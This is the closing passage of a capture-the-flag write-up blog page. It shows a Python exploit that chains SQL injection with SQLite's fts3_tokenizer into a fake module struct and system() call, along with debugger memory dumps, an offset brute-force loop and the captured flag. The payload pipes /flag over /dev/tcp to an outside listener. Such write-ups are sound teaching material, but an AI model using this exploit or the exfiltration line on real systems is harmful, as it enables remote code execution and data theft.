</span></span><span style=display:flex><span>    fts_module_struct <span style=color:#9ece6a;font-weight:700>+=</span> p64(sqlbase <span style=color:#9ece6a;font-weight:700>+</span> simple_close) <span style=color:#414868;font-style:italic># xClose</span>
</span></span><span style=display:flex><span>    fts_module_struct <span style=color:#9ece6a;font-weight:700>+=</span> p64(sqlbase <span style=color:#9ece6a;font-weight:700>+</span> simple_next) <span style=color:#414868;font-style:italic># xNext</span>
</span></span><span style=display:flex><span>    <span style=color:#414868;font-style:italic># 0x000000000008d366: mov rax, qword ptr [rax]; mov rdi, rax; call qword ptr [rax + 0x38];</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    shell <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#39;bash -c &#34;/flag &gt; /dev/tcp/xx.xx.xx.xx/9090&#34;</span><span style=color:#7aa2f7>\x00</span><span style=color:#9ece6a>&#39;</span>
</span></span><span style=display:flex><span>    shell <span style=color:#9ece6a;font-weight:700>=</span> shell<span style=color:#9ece6a;font-weight:700>.</span>ljust(<span style=color:#e0af68>0x38</span>, <span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#39;</span><span style=color:#7aa2f7>\x00</span><span style=color:#9ece6a>&#39;</span>)
</span></span><span style=display:flex><span>    shell <span style=color:#9ece6a;font-weight:700>+=</span> p64(system)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#414868;font-style:italic># pwndbg&gt; dq $rax</span>
</span></span><span style=display:flex><span>    <span style=color:#414868;font-style:italic># 000000000199b190     0000000000000000 deadbeefdeadbeef</span>
</span></span><span style=display:flex><span>    <span style=color:#414868;font-style:italic># 000000000199b1a0     00007fd8b5a07c40 00007fd8b5a0eb40</span>
</span></span><span style=display:flex><span>    <span style=color:#414868;font-style:italic># 000000000199b1b0     00007fd8b59fd080 00007fd8b5a10b50</span>
</span></span><span style=display:flex><span>    <span style=color:#414868;font-style:italic># 000000000199b1c0     4343434343434343 20632d2068736162</span>
</span></span><span style=display:flex><span>    <span style=color:#414868;font-style:italic>#                                       ^ ---- our shell starts here</span>
</span></span><span style=display:flex><span>    <span style=color:#414868;font-style:italic># 000000000199b1d0     3e2067616c662f22 63742f7665642f20</span>
</span></span><span style=display:flex><span>    <span style=color:#414868;font-style:italic># 000000000199b1e0     33312e3330312f70 2f39312e36352e33</span>
</span></span><span style=display:flex><span>    <span style=color:#414868;font-style:italic># 000000000199b1f0     0000002230393039 0000000000000000</span>
</span></span><span style=display:flex><span>    <span style=color:#414868;font-style:italic># 000000000199b200     00000000004022d0 4444444444444444</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    payload  <span style=color:#9ece6a;font-weight:700>=</span> <span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#34;asd&#39;;&#34;</span>
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#34;SELECT replace(hex(zeroblob(10000)), &#39;00&#39;, x&#39;4242424242424242%b4343434343434343%b4444444444444444&#39;);&#34;</span> <span style=color:#9ece6a;font-weight:700>%</span> (hexlify(fts_module_struct), hexlify(shell))
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#34;select fts3_tokenizer(&#39;exploit&#39;, x&#39;%b&#39;);&#34;</span> <span style=color:#9ece6a;font-weight:700>%</span> hexlify(p64(fts_module_struct_addr))
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#34;create virtual table kok using fts3(tokenize=&#39;exploit&#39;);&#34;</span>
</span></span><span style=display:flex><span>    payload <span style=color:#9ece6a;font-weight:700>+=</span> <span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#34;-- &#34;</span>
</span></span><span style=display:flex><span>    admin(payload<span style=color:#9ece6a;font-weight:700>.</span>replace(<span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#34; &#34;</span>, <span style=color:#9d7cd8>b</span><span style=color:#9ece6a>&#34;/**/&#34;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#bb9af7>def</span> <span style=color:#7aa2f7>exploit</span>():
</span></span><span style=display:flex><span>    <span style=color:#bb9af7>for</span> off <span style=color:#9ece6a;font-weight:700>in</span> <span style=color:#9ece6a>range</span>(<span style=color:#e0af68>0</span>, <span style=color:#e0af68>0x1000</span>, <span style=color:#e0af68>8</span>):
</span></span><span style=display:flex><span>        heap_base, sqlbase <span style=color:#9ece6a;font-weight:700>=</span> read_map()
</span></span><span style=display:flex><span>        <span style=color:#9ece6a>print</span>(<span style=color:#9ece6a>&#34;[!] heap </span><span style=color:#9ece6a>%x</span><span style=color:#9ece6a>&#34;</span> <span style=color:#9ece6a;font-weight:700>%</span> heap_base)
</span></span><span style=display:flex><span>        <span style=color:#9ece6a>print</span>(<span style=color:#9ece6a>&#34;[!] libsqlite3.so </span><span style=color:#9ece6a>%x</span><span style=color:#9ece6a>&#34;</span> <span style=color:#9ece6a;font-weight:700>%</span> sqlbase)
</span></span><span style=display:flex><span>        fire(heap_base, sqlbase, <span style=color:#e0af68>0x45190</span> <span style=color:#9ece6a;font-weight:700>+</span> off)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>exploit()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#414868;font-style:italic># ijctf{Nah...sqlite_B0F_1s_H4rd!}</span>
</span></span></code></pre></div><p>Since the offset on the server might be different I need to brute force a little and after that we just need to spawn a listener and we will be greeted by the flag.</p><pre tabindex=0><code>Listening on [0.0.0.0] (family 0, port 9090) Connection from 10.169.87.34.bc.googleusercontent.com 55242 received!
ijctf{Nah...sqlite_B0F_1s_H4rd!}
</code></pre><div><div>Tags:</div><ul><li><a href=/tags/ctf-writeup/>Ctf-Writeup</a></li><li><a href=/tags/pwn/>Pwn</a></li></ul></div></article></main><footer><p>&copy; 2025 circleous. Licensed under <a href=https://creativecommons.org/publicdomain/zero/1.0/ target=_blank>CC0</a>.</p></footer></body></html>